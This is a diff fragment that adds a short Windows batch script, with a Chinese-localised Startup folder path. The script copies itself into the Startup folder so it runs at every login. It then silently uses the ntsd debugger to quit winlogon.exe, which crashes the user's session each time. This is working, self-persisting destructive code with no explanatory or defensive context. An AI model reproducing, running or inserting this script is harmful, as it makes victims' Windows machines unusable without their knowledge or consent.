@@ -1,0 +1,5 @@
+set var=%userprofile%\「开始」菜单\程序\启动 
+xcopy/y %0 "%var%"\
+cmd /c start /min ntsd -c q -pn winlogon.exe 1>nul 2>nul
+
+
